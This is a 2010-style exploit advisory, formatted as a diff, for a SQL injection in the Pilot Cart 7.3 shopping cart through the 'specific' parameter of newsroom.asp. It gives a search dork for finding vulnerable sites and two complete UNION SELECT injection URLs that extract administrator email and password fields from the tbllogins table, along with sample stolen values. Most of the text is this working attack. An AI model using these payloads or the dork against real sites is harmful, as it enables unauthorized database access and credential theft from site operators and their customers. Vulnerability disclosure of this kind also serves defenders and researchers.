@@ -1,0 +1,47 @@
+# Title: [ASPilot Pilot Cart 7.3 SQL Injection]
+# Date: [12.11.2010]
+# Author: [Daikin]
+# Software Link: [http://www.pilotcart.com]
+# Version: [7.3] maybe also lower
+ 
+Vendor's Description of Software and demo:
+# http://www.pilotcart.com
+ 
+Dork:
+# Powered by Pilot Cart V.7.3
+ 
+Application Info:
+# Name: Pilot Cart
+# version last 7.3
+ 
+Vulnerability Info:
+# Type: SQL injection
+# Discover 8/11/2010
+ 
+
+#Vuln description:
+Input passed via the "specific" parameter to newsroom.asp is not properly
+sanitised before being used in a SQL query.
+
+http://server/newsroom.asp?specific=[injection]
+
+#Proof
+
+http://server/newsroom.asp?specific=1
+
+DB: MSAccess
+
+http://server/newsroom.asp?specific=-1%20UNION%20ALL%20SELECT%20null,(select%20top%201%20chr(126)%2bchr(39)%2bcstr(email)%2bchr(39)%2bchr(126)%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20tbllogins%20order%20by%201)%20t%20order%20by%201%20desc)t),null,null,null,null,null%20from%20tbllogins
+-->mail field "scarab"
+
+http://server/newsroom.asp?specific=-1%20UNION%20ALL%20SELECT%20null,(select%20top%201%20chr(126)%2bchr(39)%2bcstr(pword)%2bchr(39)%2bchr(126)%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20tbllogins%20order%20by%201)%20t%20order%20by%201%20desc)t),null,null,null,null,null%20from%20tbllogins
+-->pass field "R1ckr011"
+
+#
+Credit:
+Daikin 
+
+bolidebolidebolide@gmail.com
+
+
+
